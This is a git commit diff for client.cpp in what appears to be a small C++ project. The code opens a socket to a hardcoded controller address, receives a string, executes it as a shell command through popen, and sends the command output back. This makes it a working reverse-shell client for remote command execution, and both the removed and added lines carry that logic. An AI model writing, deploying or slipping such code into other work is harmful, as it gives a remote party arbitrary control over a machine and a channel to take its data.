59df17f7e49b5fa784ccfaa655ca56b0bc0301c1
prog-ammar <ammarofc2005@gmail.com>
2024-12-30 20:56:41 +0500

    updated client.cpp

--- client.cpp
+++ client.cpp
@@ -26,35 +26,23 @@ int main()
     string ip="192.168.1.85";
     inet_pton(AF_INET,ip.c_str(),&address.sin_addr);
     int r= connect(server,(struct sockaddr*)&address,sizeof(address));
-    if(r==-1)
+    check(r);
+    char buffer[4096];
+    memset(buffer, 0, sizeof(buffer));
+    int l=recv(server,buffer,4096,0);
+    FILE* p=popen(buffer,"r");
+    if(p==nullptr)
     {
-        cout<<"Error Ocurred";
-        close(server);
+        cout<<"Nothing to send";
     }
-    else
+    char result[4096];
+    string endresult;
+    while(fgets(result,sizeof(result),p)!=nullptr)
     {
-        char buffer[4096];
-        memset(buffer, 0, sizeof(buffer));
-        int l=recv(server,buffer,4096,0);
-        FILE* p=popen(buffer,"r");
-        if(p==nullptr)
-        {
-            cout<<"Nothing to send";
-        }
-        char result[4096];
-        string endresult;
-        while(fgets(result,sizeof(result),p)!=nullptr)
-        {
-            endresult +=result;
-        }
-        int s=send(server,endresult.c_str(),endresult.size(),0);
-        if(s==-1)
-        {
-            cout<<"Sending Error";
-            close(server);
-            exit(1);
-        }
-        fclose(p);
+        endresult +=result;
     }
+    int s=send(server,endresult.c_str(),endresult.size(),0);
+    check(s);
+    fclose(p);
     close(server);
 }
